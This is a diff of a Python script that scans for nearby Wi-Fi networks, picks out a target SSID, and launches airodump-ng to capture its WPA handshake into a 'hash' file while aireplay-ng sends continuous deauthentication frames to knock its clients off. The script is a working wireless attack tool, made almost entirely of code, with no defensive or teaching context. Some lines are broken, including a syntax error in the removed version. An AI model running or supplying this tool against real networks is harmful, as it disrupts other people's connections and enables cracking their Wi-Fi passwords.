@@ -3,82 +3,80 @@ import time
 import re
 
 def get_interface():
-    interface = input("Enter the network interface (e.g., wlan0, wlo1): ")
+    interface = input("Enter the network interface (e.g., wlan0, eth0): ")
     return interface
+
+def get_target_ssid():
+    ssid = input("Enter the SSID you want to look up: ")
+    return ssid
 
 def scan_wifi(interface):
     command = ['iwlist', interface, 'scan']
     try:
-        return subprocess.check_output(command, universal_newlines=True)
+        scan_output = subprocess.check_output(command, universal_newlines=True)
+        return scan_output
     except subprocess.CalledProcessError as e:
         print(f"Failed to scan networks: {e}")
         return None
 
-def parse_wifi_data(scan_data, ssid):
-    if scan_data:
-        network_info = {}
+def parse_networks(scan_data):
+    network_dict = {}
+    current_network = {}
+    for line in scan_data.splitlines():
+        if 'Cell' in line:  # New network block starts
+            if current_network:  # If there's accumulated network info, write it down
+                essid = current_network.get('ESSID', None)
+                if essid:
+                    network_dict[essid] = current_network
+                current_network = {}
 
-        for line in scan_data.splitlines():
-            if 'Cell' in line:  # Start of a new network block
-                if network_info:  # If there's accumulated network info, check if it's the target
-                    if network_info.get('ESSID') == ssid:
-                        return network_info
-                network_info = {}  # Reset for the next network
+        if 'Address' in line:
+            current_network['MAC'] = line.split(' ')[-1].strip()
+        elif 'ESSID' in line:
+            essid = line.split(':')[1].strip().strip('"')
+            current_network['ESSID'] = essid
+        elif 'Frequency' in line:
+            match = re.search(r'(\d+\.\d+) GHz \(Channel (\d+)\)', line)
+            if match:
+                current_network['Channel'] = match.group(2)
+        elif 'Quality' in line or 'Signal level' in line:
+            signal_strength = line.split('=')[1].split(' ')[0]
+            current_network['Signal Strength'] = signal_strength
+        elif 'Encryption key' in line:
+            current_network['Security'] = 'Encrypted' if 'on' in line else 'Open'
+        elif 'IE: IEEE' in line and ('WPA' in line or 'WPA2' in line):
+            security_type = line.split(':')[1].strip()
+            current_network['Security'] = security_type
 
-            if 'Address' in line:
-                network_info['MAC Address'] = line.split(' ')[-1].strip()
-            elif 'ESSID' in line:
-                essid = line.split(':')[1].strip().strip('"')
-                network_info['ESSID'] = essid
-            elif 'Frequency' in line:
-                match = re.search(r'(\d+\.\d+) GHz \(Channel (\d+)\)', line)
-                if match:
-                    network_info['Channel'] = match.group(2)
-            elif 'Quality' in line or 'Signal level' in line:
-                signal_strength = line.split('=')[1].split(' ')[0]
-                network_info['Signal Strength'] = signal_strength
-            elif 'Encryption key' in line:
-                network_info['Security'] = 'Encrypted' if 'on' in line else 'Open'
-            elif 'IE: IEEE' in line:
-                if 'WPA' in line or 'WPA2' in line:
-                    security_type = line.split(':')[1.strip()
-                    network_info['Security'] = security_type
+    # Check the last network too
+    if current_network and 'ESSID' in current_network:
+        essid = current_network['ESSID']
+        network_dict[essid] = current_network
 
-        # Check the last network entry
-        if network_info.get('ESSID') == ssid:
-            return network_info
-        return None
-
-def start_monitoring_tools(network_info, interface):
-    channel = network_info['Channel']
-    mac_address = network_info['MAC Address']
-    
-    # Attempt to find a suitable terminal emulator
-    terminal = "xterm"  # Default to xterm for broader compatibility
-
-    # Commands to run in new terminal windows
-    airodump_cmd = f"{terminal} -e 'bash -c \"airodump-ng -c {channel} -w hash --bssid {mac_address} {interface}; sleep 30\"'"
-    aireplay_cmd = f"{terminal} -e 'bash -c \"aireplay-ng -0 0 -a {mac_address} {interface}; sleep 30\"'"
-    
-    # Start the commands in separate terminals
-    subprocess.Popen(airodump_cmd, shell=True)
-    subprocess.Popen(aireplay_cmd, shell=True)
-
-    # Allow commands to run for 30 seconds before closing terminals automatically
-    time.sleep(35)  # Extra time to ensure that sleep commands inside terminals complete
+    return network_dict
 
 def main():
-    ssid_input = input("Enter the SSID you want to look up: ")
     interface = get_interface()
+    target_ssid = get_target_ssid()
 
     while True:
         scan_data = scan_wifi(interface)
         if scan_data:
-            network_info = parse_wifi_data(scan_data, ssid_input)
-            if network_info:
-                start_monitoring_tools(network_info, interface)
+            networks = parse_networks(scan_data)
+            if target_ssid in networks:
+                network_info = networks[target_ssid]
+                print(f"Details for SSID '{target_ssid}': {network_info}")
+                
+                # Open terminal to run airodump-ng
+                airodump_command = f'gnome-terminal -- bash -c "airodump-ng -c {network_info['Channel']} -w hash --bssid {network_info['MAC']} {interface}; sleep 30; exit"'
+                subprocess.Popen(airodump_command, shell=True)
+
+                # Open terminal to run aireplay-ng
+                aireplay_command = f'gnome-terminal -- bash -c "aireplay-ng -0 0 -a {network_info['MAC']} {interface}; sleep 30; exit"'
+                subprocess.Popen(aireplay_command, shell=True)
+
+                time.sleep(30)  # Keep running the commands for 30 seconds
                 break
-        time.sleep(5)  # Scan every 5 seconds
 
 if __name__ == "__main__":
     main()
